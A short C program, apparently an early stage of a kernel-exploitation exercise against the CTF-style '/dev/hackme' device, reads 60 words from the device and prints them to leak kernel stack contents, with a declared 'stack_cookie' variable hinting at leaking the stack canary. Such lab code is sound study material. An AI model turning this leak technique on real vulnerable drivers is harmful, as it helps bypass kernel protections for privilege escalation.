#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>

int device_fd;

void open_device(){
    device_fd = open("/dev/hackme", O_RDWR);
    if (device_fd < 0){
        puts("Failed to open /dev/hackme");
        exit(-1);
    } else {
        puts("Device /dev/hackme openned");
    }
}

unsigned long stack_cookie;
void get_leak(){

    unsigned long stack[60];
    ssize_t r = read(device_fd, stack, sizeof(stack));

    int i = 0;
    for (i; i < 60; i++){
        printf("> stack[%d]: 0x%lx\n", i, stack[i]);
    }

}


int main(void){
    open_device();
    get_leak();
}